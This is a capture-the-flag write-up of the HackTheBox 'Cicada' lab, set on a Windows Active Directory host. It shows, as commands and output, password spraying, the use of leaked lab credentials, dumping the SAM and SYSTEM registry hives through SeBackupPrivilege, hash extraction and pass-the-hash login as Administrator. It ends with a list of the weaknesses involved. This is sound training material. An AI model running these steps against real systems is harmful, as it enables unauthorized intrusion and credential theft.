---
title: "HackTheBox - Cicada"
date: 2025-02-15
categories: [Hackthebox, Labs, Writeup, Windows]
tags: [windows, active-directory, smb, cwe-260, cwe-269, cwe-521, cwe-522]
image: assets/img/posts/htb-cicada/cicada.png
---

## Introduction

This write-up details my approach to solving the HackTheBox machine "Cicada". The box demonstrates typical Active Directory enumeration and exploitation techniques, including SMB share access, password reuse, and privilege escalation through SeBackupPrivilege.

## Initial Reconnaissance

Started with a comprehensive port scan using Rustscan and Nmap:
```bash
❯ rustscan --ulimit 5000 -a cicada.htb --range 1-65535 -- -sC -sV
```

Key ports discovered:
- Port 53 (DNS)
- Port 88 (Kerberos)
- Port 139, 445 (SMB)
- Port 389, 636 (LDAP/LDAPS)
- Port 5985 (WinRM)

## Initial Foothold

### SMB Enumeration

Checked for accessible SMB shares:
```bash
❯ smbclient -L //cicada.htb/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
```

Successfully accessed the HR share and retrieved "Notice from HR.txt":
```text
❯ smb: \> ls
  .                                   D        0  Thu Mar 14 07:29:09 2024
  ..                                  D        0  Thu Mar 14 07:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 12:31:48 2024

		4168447 blocks of size 4096. 438384 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (5.6 KiloBytes/sec) (average 5.6 KiloBytes/sec)
```

The file's contents contain a password:
```text
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

### User Enumeration

Used NetExec to enumerate domain users:
```bash
❯ nxc smb cicada.htb -u 'anonymous' -p '' --rid-brute
```

Discovered several users including:
- john.smoulder
- sarah.dantelia
- michael.wrightson
- david.orelious
- emily.oscars

### Password Testing

Added these users to `users.txt` and tested the newly found password against the enumerated users:
```bash
❯ nxc smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

Successfully authenticated as `michael.wrightson`.

## Lateral Movement

### Further SMB Enumeration

Using michael.wrightson's credentials, enumerated additional user information:
```bash
❯ nxc smb cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
SMB         10.129.231.149  445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.231.149  445    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain
SMB         10.129.231.149  445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain
SMB         10.129.231.149  445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account
SMB         10.129.231.149  445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 2
SMB         10.129.231.149  445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 2
SMB         10.129.231.149  445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0
SMB         10.129.231.149  445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3
SMB         10.129.231.149  445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated 8 local users: CICADA
```

Discovered david.orelious's password in the description field, `aRt$Lp#7t*VQ!3`.

### DEV Share Access

Used david.orelious's credentials to access the DEV share we saw before and downloaded the available `Backup_script.ps1`:
```shell
❯ smbclient //cicada.htb/DEV -U 'CICADA\david.orelious%aRt$Lp#7t*VQ!3'
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 07:31:39 2024
  ..                                  D        0  Thu Mar 14 07:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 12:28:22 2024

		4168447 blocks of size 4096. 433459 blocks available
smb: \> getBackup_script.ps1
getBackup_script.ps1: command not found
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (2.6 KiloBytes/sec) (average 2.6 KiloBytes/sec)
```

The `Backup_script.ps1` contents:
```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

The `emily.oscars` user credentials are hard-coded in the script.
```powershell
$username = "emily.oscars"
$password = "Q!3@Lp#M6b*7t*Vt"
```

### WinRM Access

Successfully established WinRM connection as emily.oscars:
```powershell
evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars
```

We're able to get the user flag:
```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt
2039ac8cd90dcebb7d5f--snip--
```

## Privilege Escalation to Administrator

### SeBackupPrivilege Exploitation

Discovered emily.oscars had SeBackupPrivilege enabled:
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

[this](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) blog post explains how to escalate privileges using the `SeBackupPrivilege`.
```powershell
*Evil-WinRM* PS C:\> mkdir temp


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          2/8/2025  10:30 PM                temp


*Evil-WinRM* PS C:\> reg save hklm\sam c:\temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\system c:\temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> download sam

Info: Downloading C:\temp\sam to sam

Info: Download successful!
*Evil-WinRM* PS C:\temp> download system

Info: Downloading C:\temp\system to system

Info: Download successful!
*Evil-WinRM* PS C:\temp>
```

Extracted administrator hash using pypykatz:

```bash
❯ pypykatz registry --sam sam system

WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Finally, accessed the system as Administrator using the extracted hash:

```bash
❯ evil-winrm -i cicada.htb -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cicada\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
8b8cbd91b9693ba7bb36cd--snip--
```

## Vulnerabilities Identified

1. **Exposed Default Credentials**
   - Default password exposed in accessible SMB share
   - CWE-522: Insufficiently Protected Credentials

2. **Password in Description Field**
   - Clear text password stored in user description
   - CWE-260: Password in Configuration File

3. **Weak Password Policy**
   - Reuse of similar password patterns
   - CWE-521: Weak Password Requirements

4. **Privilege Misconfiguration**
   - SeBackupPrivilege assigned to regular user
   - CWE-269: Improper Privilege Management

## Tools Used

- Rustscan
- Nmap
- NetExec (formerly CrackMapExec)
- Evil-WinRM
- Pypykatz
- SMBClient

## References
- [CWE-522: Insufficiently Protected Credentials](https://cwe.mitre.org/data/definitions/522.html)
- [CWE-260: Password in Configuration File](https://cwe.mitre.org/data/definitions/260.html)
- [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
- [CWE-521: Weak Password Requirements](https://cwe.mitre.org/data/definitions/521.html)